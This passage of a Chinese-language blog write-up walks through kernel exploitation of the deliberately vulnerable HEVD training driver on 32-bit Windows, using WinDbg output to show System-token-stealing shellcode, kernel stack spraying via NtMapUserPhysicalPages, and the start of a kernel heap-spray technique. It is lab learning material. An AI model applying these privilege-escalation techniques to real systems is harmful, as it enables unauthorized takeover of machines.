&nbsp;&nbsp;&nbsp;+0x0b8&nbsp;ActiveProcessLinks&nbsp;:&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x8294a4f0&nbsp;-&nbsp;0x843d76a0&nbsp;]</pre><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0);"></span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">一旦获取了EPROCESS结构，我们能做很多事情，最简单的，观察偏移0xb4位置，存放着当前进程的PID，而0xb8位置，存放着一个LIST_ENTRY结构，这个结构存放着前面一个EPROCESS和后一个EPROCESS，这就很有意思了。</span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">我可以通过这种方法，遍历当前系统所有存在的EPROCESS，而且能够找到System的EPROCESS，实际上，这个_EPROCESS，我们通过Windbg的!process 0 0的方法可以获取到。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dt&nbsp;_LIST_ENTRY&nbsp;841bdad0+b8

urlmon!_LIST_ENTRY

&nbsp;[&nbsp;0x84e64290&nbsp;-&nbsp;0x8294a4f0&nbsp;]

&nbsp;&nbsp;&nbsp;+0x000&nbsp;Flink&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x84e64290&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x854670e8&nbsp;-&nbsp;0x841bdb88&nbsp;]

&nbsp;&nbsp;&nbsp;+0x004&nbsp;Blink&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x8294a4f0&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x841bdb88&nbsp;-&nbsp;0x85a5e5f0&nbsp;]



kd&gt;&nbsp;dd&nbsp;841bdad0+b8

841bdb88&nbsp;&nbsp;84e64290&nbsp;8294a4f0&nbsp;00000000&nbsp;00000000

841bdb98&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;0000000d&nbsp;8293db40

841bdba8&nbsp;&nbsp;00000000&nbsp;00644000&nbsp;00246000&nbsp;00000000

841bdbb8&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;87a01be8

841bdbc8&nbsp;&nbsp;87a0130b&nbsp;00000000&nbsp;00000000&nbsp;00000000

841bdbd8&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;841de2e0&nbsp;00000000

841bdbe8&nbsp;&nbsp;00000005&nbsp;00000040&nbsp;00000000&nbsp;00000000

841bdbf8&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000

kd&gt;&nbsp;dt&nbsp;_EPROCESS&nbsp;84e64290-b8

ntdll!_EPROCESS

&nbsp;&nbsp;&nbsp;+0x000&nbsp;Pcb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_KPROCESS

&nbsp;&nbsp;&nbsp;+0x098&nbsp;ProcessLock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_EX_PUSH_LOCK

&nbsp;&nbsp;&nbsp;+0x0a0&nbsp;CreateTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_LARGE_INTEGER&nbsp;0x1d27bbd`9fafafa2

&nbsp;&nbsp;&nbsp;+0x0a8&nbsp;ExitTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_LARGE_INTEGER&nbsp;0x0

&nbsp;&nbsp;&nbsp;+0x0b0&nbsp;RundownProtect&nbsp;&nbsp;&nbsp;:&nbsp;_EX_RUNDOWN_REF

&nbsp;&nbsp;&nbsp;+0x0b4&nbsp;UniqueProcessId&nbsp;&nbsp;:&nbsp;0x00000100&nbsp;Void

&nbsp;&nbsp;&nbsp;+0x0b8&nbsp;ActiveProcessLinks&nbsp;:&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x854670e8&nbsp;-&nbsp;0x841bdb88&nbsp;]</pre><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);"></span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">回到shellcode，后面有一个loop循环，在循环中做的事情就是不断通过链表的前向指针和后向指针找到System的_EPROCESS结构，也就是＋0xb4位置的PID为4的结构，在结构中存放着token，只要找到System的token，替换掉当前进程的token，就可以完成提权了。</span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);"><br/></span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><strong>0x02 NtMapUserPhysicalPages and Kernel Stack Spray</strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在下面的调试中，由于我多次重新跟踪调试，所以每次申请的shellcode指针地址都不太一样，但不影响理解。<br/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在HEVD项目中涉及到一种方法，可以进行Kernel Stack Spray，其实在内核漏洞中，未初始化的堆栈这种漏洞相对少，而且在Windows系统中内核堆栈不像用户态的堆栈，是共用的一片空间，因此如果使用Kernel Stack Spray是有一定风险的，比如可能覆盖到某些其他的API指针。在作者博客中也提到这种Kernel Stack Spray是一种比较冷门的方法，但也比较有意思。这里我就和大家一起分析一下，利用NtMapUserPhysicalPages这个API完成内核栈喷射的过程。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为什么要用NtMapUserPhysicalPages，别忘了我们执行提权Exploit的时候，是处于用户态，在用户态时使用的栈地址是用户栈，如果我们想在用户态操作内核栈，可以用这个函数在用户态来完成对内核栈的控制。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">j00ru博客对应内容文章地址：<a href="http://j00ru.vexillium.org/?p=769" _src="http://j00ru.vexillium.org/?p=769">http://j00ru.vexillium.org/?p=769</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先我们触发的是Uninitialized Stack这个漏洞，在触发之前，我们需要对内核栈进行喷射，这样可以将shellcode函数指针覆盖到HEVD.sys的结构体中。用到的就是NtMapUserPhysicalPages这个方法。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个方法存在于ntkrnlpa.exe中，也就是nt!NtMapUserPhysicalPages，首先到达这个函数调用的时候，进入内核态，我们可以通过cs段寄存器来判断，一般cs为0x8时处于内核态，为0x1b时处于用户态。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;r&nbsp;cs
cs=00000008


kd&gt;&nbsp;r
eax=00000000&nbsp;ebx=00000000&nbsp;ecx=01342800&nbsp;edx=00000065&nbsp;esi=85844980&nbsp;edi=85bd88b0
eip=95327d10&nbsp;esp=8c1f197c&nbsp;ebp=8c1f1aa8&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;ng&nbsp;nz&nbsp;ac&nbsp;po&nbsp;nc
cs=0008&nbsp;&nbsp;ss=0010&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=0030&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000292</pre><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0);">在此之前，内核栈的情况如下图：</span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 0em; text-align: center;"><img src="http://p2.qhimg.com/t01ff5bbc3e9970f810.jpg" title="t0192b1162c4a81e267.jpg" alt="http://p7.qhimg.com/t0192b1162c4a81e267.jpg"/></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 0em;"><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注意esp和ebp，现在处于内核栈中，这时候，我们可以通过对内核栈下写入断点，这样在向栈写入数据，也就是栈喷射时会中断。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;g
nt!memcpy+0x33:
82882393&nbsp;f3a5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movs&nbsp;dword&nbsp;ptr&nbsp;es:[edi],dword&nbsp;ptr&nbsp;[esi]</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，在nt!memcpy中断，这时候执行的是一处拷贝操作，这时候通过kb查看一下堆栈回溯。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;kb
ChildEBP&nbsp;RetAddr&nbsp;&nbsp;Args&nbsp;to&nbsp;Child&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
94d12af4&nbsp;82b2131b&nbsp;94d12c20&nbsp;003b09f8&nbsp;00001000&nbsp;nt!memcpy+0x33
94d12b34&nbsp;82b1f58d&nbsp;94d12c20&nbsp;00000000&nbsp;00b1fcb8&nbsp;nt!MiCaptureUlongPtrArray+0x3f
94d13c20&nbsp;82886db6&nbsp;00000000&nbsp;00000400&nbsp;003b09f8&nbsp;nt!NtMapUserPhysicalPages+0x9e
94d13c20&nbsp;77ca6c74&nbsp;00000000&nbsp;00000400&nbsp;003b09f8&nbsp;nt!KiSystemServicePostCall</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，函数的调用是NtMapUserPhysicalPages -&gt; MiCaptureUlongPtrArray -&gt; memcpy，来看一下这个过程的函数实现，首先是nt!NtMapUserPhysicalPages</span></p><pre class="brush:cpp;toolbar:false">NTSTATUS&nbsp;__stdcall&nbsp;NtMapUserPhysicalPages(PVOID&nbsp;BaseAddress,&nbsp;PULONG&nbsp;NumberOfPages,&nbsp;PULONG&nbsp;PageFrameNumbers)
&nbsp;&nbsp;if&nbsp;(&nbsp;(unsigned&nbsp;int)NumberOfPages&nbsp;&gt;&nbsp;0xFFFFF&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1073741584;
&nbsp;&nbsp;BaseAddressa&nbsp;=&nbsp;(unsigned&nbsp;int)BaseAddress&nbsp;&amp;&nbsp;0xFFFFF000;
&nbsp;&nbsp;v33&nbsp;=&nbsp;((_DWORD)NumberOfPages&nbsp;&lt;&lt;&nbsp;12)&nbsp;+&nbsp;BaseAddressa&nbsp;-&nbsp;1;
&nbsp;&nbsp;if&nbsp;(&nbsp;v33&nbsp;&lt;=&nbsp;BaseAddressa&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1073741584;
&nbsp;&nbsp;v4&nbsp;=&nbsp;&amp;P;//栈地址
&nbsp;&nbsp;v39&nbsp;=&nbsp;0;
&nbsp;&nbsp;v37&nbsp;=&nbsp;&amp;P;
&nbsp;&nbsp;if&nbsp;(&nbsp;PageFrameNumbers&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!NumberOfPages&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;(unsigned&nbsp;int)NumberOfPages&nbsp;&gt;&nbsp;0x400&nbsp;)//如果要超过1024，就要扩展池，不过这里不用
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v4&nbsp;=&nbsp;(char&nbsp;*)ExAllocatePoolWithTag(0,&nbsp;4&nbsp;*&nbsp;(_DWORD)NumberOfPages,&nbsp;0x77526D4Du);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v37&nbsp;=&nbsp;v4;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v4&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1073741670;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">v5 = MiCaptureUlongPtrArray((int)NumberOfPages, (unsigned int)PageFrameNumbers, v4);//v4 要拷贝的目标 内核栈 &nbsp;a2，要覆盖的EoPBuffer &nbsp;长度是4*NumberOfPages</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对应的注释已经标记，在函数中调用了MiCaptureUlongPtrArray，会将传入NtMapUserPhysicalPages的参数，长度也就是NumberOfPages，内容也就是PageFrameNumbers(详情请参考Exploit中的UninitializedStackVariable.c)，然后进入MiCaptureUlongPtrArray。</span></p><pre class="brush:as3;toolbar:false">int&nbsp;__fastcall&nbsp;MiCaptureUlongPtrArray(int&nbsp;a1,&nbsp;unsigned&nbsp;int&nbsp;a2,&nbsp;void&nbsp;*a3)
{
&nbsp;&nbsp;size_t&nbsp;v3;&nbsp;//&nbsp;ecx@1
&nbsp;&nbsp;v3&nbsp;=&nbsp;4&nbsp;*&nbsp;a1;
&nbsp;&nbsp;if&nbsp;(&nbsp;v3&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;a2&nbsp;&amp;&nbsp;3&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExRaiseDatatypeMisalignment();
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v3&nbsp;+&nbsp;a2&nbsp;&gt;&nbsp;(unsigned&nbsp;int)MmUserProbeAddress&nbsp;||&nbsp;v3&nbsp;+&nbsp;a2&nbsp;&lt;&nbsp;a2&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_BYTE&nbsp;*)MmUserProbeAddress&nbsp;=&nbsp;0;
&nbsp;&nbsp;}
&nbsp;&nbsp;memcpy(a3,&nbsp;(const&nbsp;void&nbsp;*)a2,&nbsp;v3);
&nbsp;&nbsp;return&nbsp;0;
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">进入后，会将shellcode的内容拷贝到a3，也就是&amp;P，内核栈中。</span></p><pre class="brush:c#;toolbar:false">kd&gt;&nbsp;p
nt!memcpy+0x35:
82882395&nbsp;ff2495ac248882&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;nt!memcpy+0x14c&nbsp;(828824ac)[edx*4]
kd&gt;&nbsp;dd&nbsp;94d139e4
94d139e4&nbsp;&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800
94d139f4&nbsp;&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800
94d13a04&nbsp;&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800
94d13a14&nbsp;&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800
94d13a24&nbsp;&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800&nbsp;00c62800</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">memcpy之后，可以看到栈地址空间被喷射上了shellcode的指针，接下来触发漏洞，关于触发的原理阅读HEVD.sys源码很清晰，这里不详细介绍，大致就是当传入的UserValue，和漏洞的MagicValue不一样的情况下，就可以引发未初始化变量。</span></p><pre class="brush:diff;toolbar:false;">kd&gt;&nbsp;p
HEVD+0x2cac:
95327cac&nbsp;8b95ecfeffff&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[ebp-114h]
kd&gt;&nbsp;dd&nbsp;ebp-114
8c1f1994&nbsp;&nbsp;baadf00d&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19a4&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19b4&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19c4&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19d4&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19e4&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19f4&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">在进入HEVD的Trigger函数之后，可以看到此时内核栈已经被覆盖，这时候UserValue的值，也就是我们可控的值是baadf00d，随后看一下StackVariable结构体的内容。</span></p><pre class="brush:c#;toolbar:false">kd&gt;&nbsp;p
HEVD+0x2ccc:
95327ccc&nbsp;e853d8ffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;HEVD+0x524&nbsp;(95325524)
kd&gt;&nbsp;r&nbsp;eax
eax=8c1f1998
kd&gt;&nbsp;dd&nbsp;8c1f1998
8c1f1998&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19a8&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19b8&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800
8c1f19c8&nbsp;&nbsp;01342800&nbsp;01342800&nbsp;01342800&nbsp;01342800</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">随后会对UserValue和MagicValue进行比较。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;p
HEVD+0x2cda:
95327cda&nbsp;3b4de0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[ebp-20h]
kd&gt;&nbsp;p
HEVD+0x2cdd:
95327cdd&nbsp;7516&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD+0x2cf5&nbsp;(95327cf5)
kd&gt;&nbsp;r&nbsp;ecx
ecx=baadf00d
kd&gt;&nbsp;dd&nbsp;ebp-20
8c1f1a88&nbsp;&nbsp;bad0b0b0</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">UserValue是baadf00d，而HEVD.sys的MagicValue的值是bad0b0b0，不相等的情况下，不会对之前的StackVariable结构体中的成员变量初始化，而此时成员变量的值都被shellcode覆盖，最后引用，导致在内核态进入shellcode。</span></p><pre class="brush:cf;toolbar:false">kd&gt;&nbsp;p
HEVD+0x2d33:
95327d33&nbsp;ff95f4feffff&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-10Ch]
kd&gt;&nbsp;dd&nbsp;ebp-10c
8c1f199c&nbsp;&nbsp;01342800
01342800&nbsp;55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebp
01342801&nbsp;8bec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp,esp
01342803&nbsp;83e4f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,0FFFFFFF8h
01342806&nbsp;83ec34&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,34h
01342809&nbsp;33c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
0134280b&nbsp;56&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi
0134280c&nbsp;33f6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,esi</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">最后在内核态执行shellcode，替换当前进程token为System token，完成提权。</span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 0em; text-align: center;"><img src="http://p7.qhimg.com/t010889c2878e02a0b8.png" title="t010889c2878e02a0b8.png" alt="http://p7.qhimg.com/t010889c2878e02a0b8.png"/></p><p><br/></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">0x03 Uninitialized Stack &amp; Heap</span></strong></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">最后就是关于这次challenge了，其实这个challenge非常好理解，如果做过浏览器或者其他跟堆有关漏洞的小伙伴肯定第一时间想到的就是Heap Spray，没错，堆喷！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">利用内核堆喷，我们可以完成对堆结构的控制，最后完成提权，在文章最后，我放一个我修改了UninitializedHeapVariable对应Exploit内容的项目地址，可以利用我的这个项目地址完成提权。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">但是，内核堆喷和应用层的堆喷不太一样，要解决两个问题，第一个shellcode放在哪里，第二个如何在用户态向内核堆进行喷射。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">解决问题的关键在于NtAllocateVirtualMemory和CreateMutex，首先NtAllocateVirtualMemory对于内核熟悉的小伙伴肯定不会陌生，看过我前面两篇内核调试学习的小伙伴也不会陌生，在很多内核漏洞利用场景中，都会用到这个函数，这个函数可以用来申请零页内存，来完成shellcode的布局。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">如何布局是一个问题，这里来看一下漏洞触发位置的调用。</span></p><pre class="brush:cpp;toolbar:false">92319abd&nbsp;83c408&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,8
92319ac0&nbsp;8b4ddc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[ebp-24h]
92319ac3&nbsp;8b5104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[ecx+4]
92319ac6&nbsp;ffd2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;edx&nbsp;{00460046}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">如果我们能够控制edx的话，这里调用的就是刚才通过NtAllocateVirtualMemory申请的内存，这里可以直接往这里面存放shellcode，可是我从老外那学到了一种方法，就是获取shellcode的函数入口指针，然后这里存放68+addr+c3的组合，这样call调用后，执行的内容就是。</span></p><pre class="brush:diff;toolbar:false">kd&gt;&nbsp;t
00640066&nbsp;68b0141401&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;11414B0h
kd&gt;&nbsp;p
